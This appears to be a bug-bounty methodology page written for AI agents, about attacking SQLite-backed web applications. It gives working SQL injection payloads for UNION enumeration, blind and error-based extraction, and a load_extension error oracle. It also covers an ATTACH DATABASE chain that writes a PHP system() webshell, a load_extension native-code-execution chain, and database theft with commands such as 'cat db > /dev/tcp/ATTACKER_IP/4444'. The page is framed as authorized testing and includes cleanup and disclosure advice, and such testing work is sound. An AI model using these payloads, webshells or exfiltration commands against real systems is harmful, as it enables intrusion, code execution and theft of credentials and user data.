---
technology: SQLite
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: databases
evidence: "43 writeups (see ../internal coverage ledger)"
provenance: "corpus-mined from 43 writeups in the writeup corpus + upstream-verified: sqlite.org lang_attach.html / c3ref/open.html (ATTACH + create-on-open semantics), SQLite loadext.c and docs (extension loading disabled by default; 'not authorized'; SQLITE_DBCONFIG keeps the SQL function off), sqlite.org file-format docs for sqlite_master/rootpage reach via corpus payloads. Accessed 2026-11-12"
---

Companion page: [[sqlite|SQLite overview]] — what the engine is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# SQLite Bug Bounty Methodology

**Scope:** SQLite as the embedded backend of web applications and products — injection dialect, file-write and extension-load primitives, database-file theft, and offline analysis with the `sqlite3` CLI. **Out of scope:** the hosting application's non-SQLite bugs, network database engines (mysql/postgres/mssql units), and password-hash cracking theory (the app's own hash format governs).

**Authorization:** presume written permission. File-write phases (ATTACH webshell, extension loading) modify the target filesystem — confirm the engagement rules cover webshell drops, prefer a proof-of-write (`example.com`-named marker table) over persistent shells, and clean up created files.

## Decision tree (one screen)

1. SQL execution confirmed or suspected → Phase 2; identify the engine first (`sqlite_version()`).
2. Any file-read/copy primitive or a found `*.db`/`*.sqlite3` file → Phase 4 (theft + offline).
3. Injection + stacked statements work + writable web root → Phase 3 (ATTACH file write).
4. `load_extension('/dev/null')` errors with `file too short` (not `not authorized`) → Phase 3b (extension RCE).
5. Source/config of a sqlite-backed app in hand → Phase 5 (find the file path, the API calls, the concatenation).

## Phase 1 — Fingerprinting the backend

```sql
-- UNION contexts: version answers 3.x on SQLite, errors elsewhere
' UNION SELECT sqlite_version(),2,3,4 -- -
-- error-based contexts: the SQLite error dialect is distinctive
' and load_extension(1))-- -        -- "not authorized" or similar engine error, not a driver error
```

Wire/server tells: there is none — SQLite never listens. Infer from the stack instead: Flask/Django/Rails defaults, PHP `PDO('sqlite:...')` in leaked source, a `db.sqlite3`/`development.sqlite3`/`instance/*.db` file in a directory listing, or product data files (`grafana.db`, `gitea.db`, `bolt.db`, `pgadmin4.db`, `Duplicati-server.sqlite`-style names under a product's data directory). In API/gRPC-style apps the JSON error text after a bad query often carries the engine's message verbatim.

## Phase 2 — Injection exploitation

**2a. UNION enumeration — everything routes through sqlite_master:**

```sql
' UNION SELECT sqlite_version(),2,3,4 -- -                       -- confirm + version
' UNION SELECT name,2,3,4 FROM sqlite_master WHERE type='table' -- -
' UNION SELECT sql,2,3,4 FROM sqlite_master WHERE name='users' -- -  -- full CREATE statement = column list
' UNION SELECT group_concat(name),2,3 FROM sqlite_master WHERE type='table' -- -
```

When the injectable column only renders one value and `LIMIT` is filtered, the `rootpage` walk avoids both: tables are numbered from 1 upward, so `WHERE rootpage = 1`, `= 2`, … yields names, and `SELECT sql ... WHERE rootpage = N` yields each schema without `LIMIT`/`OFFSET` keywords. This walk is the reliable pattern in filter-heavy apps.

**2b. Blind boolean via CASE WHEN (no SLEEP in SQLite):**

```sql
' AND CASE WHEN (SUBSTR((SELECT version()),1,1)='3') THEN 1 ELSE 0 END)-- -
```

Drive it with the usual binary-search/`length()`+`substr()` loop over `sqlite_master` then data rows. Package with sqlmap (`--dbms=sqlite`, technique flags for boolean-blind) once the dialect is confirmed by hand.

**2c. Error oracle via load_extension (the high-value oracle):**

```sql
' and load_extension(1))-- -
' and CASE WHEN (COND) THEN 1 ELSE load_extension(1) END)-- -
```

`load_extension(1)` with a non-string argument raises an engine error on every evaluation; wrapping it as the ELSE branch of `CASE WHEN` converts any boolean condition into error/no-error — much faster than content-based blind. Upstream ground truth: extension loading is disabled by default at the C level and the SQL function returns `not authorized` when off — that error still distinguishes true from false, because the argument check fires first. (The same primitive used with a valid path is Phase 3b.)

**2d. Write-adjacent SQL worth trying:** `PRAGMA` reads leak configuration (`page_size`, `journal_mode`, `user_version`); `ATTACH` is covered next; stacked statements (`x'; ...`) work when the driver allows multi-statement execution — test explicitly, since several PHP/Python drivers refuse it.

## Phase 3 — From SQL to filesystem

**3a. ATTACH DATABASE file write (webshell pattern):**

```sql
x');ATTACH DATABASE '/var/www/example.com/app/shell.php' AS lol;
CREATE TABLE lol.pwn (z TEXT);
INSERT INTO lol.pwn VALUES ('<?php system($_GET["c"]); ?>');-- -
```

Preconditions, in order of usual failure: stacked statements must execute (the injection point must allow `;`-separated statements); the app user must be able to create the target path (web root, `/tmp`, its own data dir); the target file must not already exist (an existing non-database file makes the ATTACH fail — pick a fresh name). The written file begins with the `SQLite format 3` magic header; interpreters skip those bytes and execute the row payload, so the row content is the shell. Inside stacked-SQLi the whole thing rides one URL-encoded payload; the technique also appears in application code paths where user input reaches an `ATTACH` (a web app assembling an `ATTACH` path from a request parameter writes attacker-named database files wherever the app user can write).

**3b. load_extension() → native code execution:**

```sql
-- probe first: 'not authorized' = disabled (stop); 'file too short'/'unable to open' = ENABLED (continue)
SELECT load_extension('/dev/null');
-- real attempt: library reachable by the app process; entry point must match the filename
SELECT load_extension('./pwn','sqlite3_pwn_init');   -- or name the file so the default entry matches
```

The entry-point convention: an extension exports `sqlite3_<basename>_init` (or the generic `sqlite3_extension_init`), so a shared object named `pwn.so` exports `sqlite3_pwn_init` unless the second argument overrides the lookup. Delivery needs any path the app process can read (upload feature, SMB/NFS mount, `/tmp` + a local-file read). This chain is rare but decisive: it is RCE, not just file write. Upstream ground truth: drivers are supposed to keep the SQL function disabled precisely to stop SQL injection from reaching it — an enabled one is a misconfiguration.

## Phase 4 — Database-file theft and offline analysis

Find and copy:

```bash
find / -name '*.db' -o -name '*.sqlite3' -o -name '*.sqlite' 2>/dev/null
ls -la <appdir>/instance/ <appdir>/db/ <productdata>/            # -wal/-shm sidecars too
scp user@198.51.100.10:/opt/product/data/product.db .            # or: nc listener, or: cat db > /dev/tcp/ATTACKER_IP/4444
```

Confirm and open (never trust the extension — check magic):

```bash
file loot.db                 # "SQLite 3.x database, last written using SQLite version ..."
sqlite3 loot.db              # .tables  →  .schema users  →  .mode line  →  .headers on  →  SELECT * FROM users;
sqlite3 loot.db '.dump'      # full text export, greppable
sqlite3 -readonly loot.db    # don't mutate evidence you may return to
```

Loot order inside an unknown database: table list (`sqlite_master`) → `users`/`accounts`/`members` rows (hashes, emails, roles) → session/token tables → product config tables (API keys, SMTP creds, embedded product secrets). Application hashes inside the file crack per their own format (bcrypt etc.) — everything else is usually plaintext. When the file is a truncated carve or the newest rows are missing, re-copy with the WAL sidecars; `strings` still yields the plaintext rows of a damaged file.

## Phase 5 — Source review of sqlite-backed apps

Markers to grep once you can read application source or config:

- PHP: `new PDO('sqlite:` / `new SQLite3(` / `SQLite3::` — note which driver (multi-statement behavior decides Phase 3).
- Python: `sqlite3.connect(` — check `.execute()` calls with `%`/`+`/f-string formatting (injection) and `enable_load_extension(` (Phase 3b precondition).
- Path/config: `DB_PATH=`, `SQLALCHEMY_DATABASE_URI=sqlite:///`, `database:` blocks naming `storage/development.sqlite3`-style paths — the file to steal in Phase 4.
- The DB filename in source beats guessing: instance dirs, `/var/db/`, product data dirs.

## Disclosure notes

- Separate the three impact classes: read (UNION/blind), file write (ATTACH), code execution (enabled load_extension). Report each with its precondition (stacked statements, writable dir, enabled extension loading) — an APPEND-only "SQLi: critical" is wrong when the engine can't write.
- ATTACH chains: name the created file explicitly and remove it after proof.
- A stolen database file is a data breach on its own — list the row classes recovered (credentials, sessions, tokens), not just "database dumped".
- Version claims: `sqlite_version()` output belongs in the report; SQLite the library being current does NOT patch ATTACH/load_extension — they are features, so "vulnerable version" framing is wrong for these chains.

## Appendix A — Tool mapping (prose)

- **sqlite3 CLI** — offline looting (`.tables`, `.schema`, `.dump`, `.mode`), stacked-query testing, `-readonly` for evidence-safe opening.
- **sqlmap** — automated extraction once the dialect is confirmed; force `--dbms=sqlite` and expect boolean/error techniques (no time-based SLEEP).
- **DB Browser for SQLite / sqlitebrowser** — GUI inspection of exfiltrated files; same reads as the CLI with a visual schema tree.
- **file / strings** — magic-byte confirmation and plaintext row carving from damaged or partial files.
- **nc, scp, Bash /dev/tcp** — database exfiltration transports once a foothold exists.
- **curl / Burp Suite** — driving the injection points in Phase 2.
